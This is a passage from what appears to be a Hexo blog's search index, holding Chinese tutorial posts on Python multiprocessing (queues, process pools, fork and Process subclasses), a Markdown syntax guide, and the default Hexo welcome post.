Queue.get(block=True,timeout=2)） 2）如果block值为False，消息列队如果为空，则会立刻抛出”Queue.Empty”异常； Queue.put(item,[block[, timeout]])：将item消息写入队列，block默认值为True； 1）如果block使用默认值，且没有设置timeout（单位秒），消息列队如果已经没有空间可写入，此时程序将被阻塞（停在写入状态），直到从消息列队腾出空间为止，如果设置了timeout，则会等待timeout秒，若还没空间，则抛出”Queue.Full”异常；（如 Queue.put(‘xxx’block=True,timeout=2)） 2）如果block值为False，消息列队如果没有空间可写入，则会立刻抛出”Queue.Full”异常； Queue.get_nowait()：相当Queue.get(False)； Queue.put_nowait(item)：相当Queue.put(item, False)； Queue实例在父进程中创建两个子进程，一个往Queue里写数据，一个从Queue里读数据： 1234567891011121314151617181920212223242526272829303132from multiprocessing import Process, Queueimport os, timedef write_data(queue): for value in ['Message1', 'Message2', 'Message3']: print("Put %s to queue..." %value) queue.put(value) # 加入消息队列 time.sleep(2)def read_data(queue): while True: if not queue.empty(): # 判断消息队列是否为空 value = queue.get(True) # 默认值为True，获取消息队列中的一个值 print("Get %s to queue..." %value) time.sleep(2) else: breakif __name__ == '__main__': # 当前父进程创建Queue,供两个子进程读写 q = Queue() # 初始化队列 ，未传入参数时，即可不受限制接受消息 pw = Process(target=write_data, args=(q,)) # 创建写进程 pr = Process(target=read_data, args=(q,)) # 创建读进程 # 写进程pw开启 pw.start() # 等待写进程pw结束 pw.join() # 读进程pr开启 pr.start() # 等待度进程pr结束 pr.join() print("...Done") 执行结果： 1234567Put Message1 to queue...Put Message2 to queue...Put Message3 to queue...Get Message1 to queue...Get Message2 to queue...Get Message3 to queue......Done 进程池通信Queue如果要使用Pool创建进程，就需要使用multiprocessing.Manager()中的Queue()，而不是multiprocessing.Queue()，否则会得到一条如下的错误信息： RuntimeError: Queue objects should only be shared between processes through inheritance. 下面的实例演示了进程池中的进程如何通信： 123456789101112131415161718192021222324from multiprocessing import Manager, Poolimport os, timedef reader(queue): print("reader启动(%s),父进程为(%s)"%(os.getpid(),os.getppid())) for i in range(queue.qsize()): print("reader从Queue获取到消息：%s "% queue.get(True)) def writer(queue): print("writer启动(%s),父进程为(%s)"%(os.getpid(),os.getppid())) for i in ['Message1', 'Message2', 'Message3', 'Message4']: queue.put(i)if __name__ == '__main__': print("(%s) start"%os.getpid()) q = Manager().Queue() #使用Manager中的Queue来初始化 po = Pool() #使用阻塞模式创建进程，这样就不需要在reader中使用死循环了，可以让writer完全执行完成后，再用reader去读取 po.apply(writer,(q,)) po.apply(reader,(q,)) po.close() po.join() print("(%s) End"%os.getpid()) 执行结果： 12345678(12196) startwriter启动(6812),父进程为(12196)reader启动(7992),父进程为(12196)reader从Queue获取到消息：Message1reader从Queue获取到消息：Message2reader从Queue获取到消息：Message3reader从Queue获取到消息：Message4(12196) End]]></content>
      <categories>
        <category>python系统编程</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python创建进程的三种方式]]></title>
    <url>%2F2019%2F07%2F09%2FPython%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[python创建进程的三种方式 fork创建 multiprocessing 模块 Process类 继承Process类, 子类创建 1.fork创建os.fork方法会创建出一个子进程，原进程（父进程）返回一个大于零的值（即ret &gt; 0），这个值恰好是子进程的pid；而创建的新的子进程返回的值为零（即ret = 0）fork方法创建进程不适用于window系统，window系统中没有这个系统调用 1234567891011import osret = os.fork() if ret == 0: #子进程 print("Sub process pid = %d, Sub process ppid = %d" % (os.getpid(), os.getppid()))else: #父进程 print("Parent Process ret = %d" % ret) print("Parent Process pid = %d" % os.getpid()) 执行效果: 123Parent Process ret = 2757Parent Process pid = 2756Sub process pid = 2757, Sub process ppid = 2756 2.multiprocessing 模块 Process类通过Multiprocessing模块中的Process类,创建Process对象,target参数传入的是子进程执行的函数戴码, 通过start方法开启子进程 123456789101112131415161718from multiprocessing import Processimport timeimport osdef test(): time.sleep(2) print('子进程Process (pid:&#123;&#125;) starting...'.format(os.getpid())) if __name__ == '__main__': p = Process(target=test) p.start() p.join(3) # （堵塞）等待子进程结束，再执行父进程 join(timout) 超时时间 # 传入 1s 父进程等待1s，若超过1秒，子进程未结束，父进程先运行 # 传入3s 等待时间未结束，子进程结束，父进程运行 # 如果没有传入参数 父进程只有等待子进程结束，再运行 print('父进程Process (pid:&#123;&#125;) starting...'.format(os.getpid())) 注:fork方法创建的进程，主进程不会等待子进程结束再结束Process类创建的进程，默认情况主进程会等待子进程都结束，再结束 3.继承Process类, 子类创建创建一个子类, 继承Process类, 重写run方法, 实例出一个对象, 调用start方法运行子进程,调用start方法，会自动调用run方法 1234567891011121314151617from multiprocessing import Processimport timeimport osclass NewProcess(Process): #继承Process类 def run(self): # 重写run方法 while True: print('子进程Process (pid:&#123;&#125;) starting...'.format(os.getpid())) time.sleep(1)if __name__ == '__main__': p = NewProcess() # 实例化一个子进程对象 p.start() # 运行子进程的代码(即run方法) while True: print('父进程Process (pid:&#123;&#125;) starting...'.format(os.getpid())) time.sleep(1)]]></content>
      <categories>
        <category>python系统编程</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的第一篇博客]]></title>
    <url>%2F2019%2F06%2F30%2F%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[这是我的第一篇博客 Markdown常用的语法 Markdown常用语法1.标题 1234567语法:# 一级标题## 二级标题### 三级标题#### 四级级标题##### 五级标题###### 六级标题 2.字体 1加粗: *字体* 效果: 字体 1斜体: **字体** 效果: 字体 1斜体加粗: ***字体*** 效果: 字体 1删除线: ~~字体~~ 效果: 字体 3.代码格式 编程语言可以更换格式: 效果： 1print("hello,world~"); 4.插入图片 在根目录sourse文件夹里创建一个images文件夹, 将图片放在 source/images/ 下 1格式: ![image](/images/xxx.jpg) 效果如下: 5.引用 在引用的文字前加&gt;，可以无限加… 1引用: &gt; 效果: 引用 引用 引用 引用 6.分割线 三个或者三个以上的 - 或者 * 都可以 1格式: ---或*** 7.超链接 12格式:[超链接名](超链接地址 "超链接title") 效果:百度淘宝 8.列表 1234无序列表: * 这是一个列表 + 这是一个列表 - 这是一个列表 效果: 这是一个列表 这是一个列表 这是一个列表 12345有序列表: 1. 这是一个列表 2. 这是一个列表 3. 这是一个列表 4. 这是一个列表 效果: 这是一个列表 这是一个列表 这是一个列表 这是一个列表 9.表格 表格内容对齐方式: -： 左对齐:-: ： 居中对齐-: ： 右对齐 123456格式: 表头1 | 表头2 | 表头3 | 表头4 - | :- | :-: | -: | 默认左对齐|左对齐|居中对齐|右对齐 默认左对齐|左对齐|居中对齐|右对齐 默认左对齐|左对齐|居中对齐|右对齐 效果: 表头1 表头2 表头3 表头4 默认左对齐 左对齐 居中对齐 右对齐 默认左对齐 左对齐 居中对齐 右对齐 默认左对齐 左对齐 居中对齐 右对齐 10.全文阅读在文章要不显示的部分前，添加以下内容 1格式: &lt;!-- more --&gt; markdown语法进阶1.字体、大小、颜色123456789语法:&lt;font face=&quot;黑体&quot;&gt;我是黑体字&lt;/font&gt; &lt;font face=&quot;微软雅黑&quot;&gt;我是微软雅黑&lt;/font&gt; &lt;font face=&quot;STCAIYUN&quot;&gt;我是华文彩云&lt;/font&gt; &lt;font color=red&gt;我是红色&lt;/font&gt; &lt;font color=#008000&gt;我是绿色&lt;/font&gt; &lt;font color=Blue&gt;我是蓝色&lt;/font&gt; &lt;font size=5&gt;我是尺寸&lt;/font&gt; &lt;font face=&quot;黑体&quot; color=green size=5&gt;我是黑体，绿色，尺寸为5&lt;/font&gt; 我是黑体字我是微软雅黑我是华文彩云我是红色我是绿色我是蓝色我是尺寸我是黑体，绿色，尺寸为5 2.文字背景1&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=yellow&gt;文字背景&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; 文字背景]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>导航</tag>
        <tag>分享</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F06%2F30%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
